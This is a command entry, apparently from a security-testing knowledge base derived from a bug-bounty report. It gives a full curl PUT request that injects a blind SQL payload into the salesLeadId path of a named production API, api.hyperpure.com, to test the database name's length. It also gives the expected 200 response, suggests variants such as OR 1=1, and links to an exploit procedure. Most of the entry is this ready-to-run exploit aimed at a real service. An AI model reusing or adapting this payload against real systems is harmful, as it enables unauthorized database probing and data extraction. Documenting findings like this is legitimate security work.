---
id: cmd-uuid-002
data: >-
  curl -X PUT
  "https://api.hyperpure.com/consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc\"
  AND (length(database())) = \"11 --+-" -H "Content-Type:
  application/json;charset=utf-8" -H "X-Client: consumer" -H "X-TrackingId:
  8242c5a2-6325-4101-96b8-c7ed6008e92a" -H "HeaderRoute: v2" -H "APIVersion:
  4.2" -H "AppType: web" -H "Origin: https://www.hyperpure.com/" -H "Referer:
  https://www.hyperpure.com/register" -d
  '{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":"388001"},"deliveryTime":0,"email":"hoteyes@wearehackerone.com","outletName":"test","phoneNumber":"███","salesLeadId":"31cf8eb0-f81e-4c99-acad-35eae89ed659"}'
tags:
  - sqli
  - injection
  - api
type: command
output: >-
  HTTP/1.1 200 OK with
  {"response":{"salesLeadId":"6b6a8a5a-4a74-46db-b2fe-32a46f927ecc\" AND
  (length(database())) = \"11 --+-"}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.113Z'
verified: false
validated: true
submitted: true
---
# sqli-payload-put-saleslead

## Command

```bash
curl -X PUT "https://api.hyperpure.com/consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc\" AND (length(database())) = \"11 --+-" -H "Content-Type: application/json;charset=utf-8" -H "X-Client: consumer" -H "X-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a" -H "HeaderRoute: v2" -H "APIVersion: 4.2" -H "AppType: web" -H "Origin: https://www.hyperpure.com/" -H "Referer: https://www.hyperpure.com/register" -d '{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":"388001"},"deliveryTime":0,"email":"hoteyes@wearehackerone.com","outletName":"test","phoneNumber":"███","salesLeadId":"31cf8eb0-f81e-4c99-acad-35eae89ed659"}'
```

## Description

Injects a SQL payload into the salesLeadId URL parameter to test blind SQL injection, specifically extracting database name length by checking if it equals 11 characters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Payload in URL | SQL injection string (e.g., " AND (length(database())) = "11 --+-) | Yes |
| email | Test email | Yes |
| phoneNumber | Redacted phone | Yes |
| salesLeadId in body | Valid UUID | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT "https://api.hyperpure.com/consumer/onboarding/saleslead/{uuid} {payload}" [headers] -d '{json}'
```

### Advanced Usage

Adapt payload for different conditions, e.g., AND 1=1 or OR 1=1, to test true/false or manipulation.

## Expected Output

HTTP/1.1 200 OK with echoed payload in salesLeadId, confirming the condition (e.g., length=11).

## Related

- [[commands/normal-put-saleslead-creation]]
- [[procedures/Exploit-Blind-SQL-Injection-in-Sales-Lead-Endpoint]]
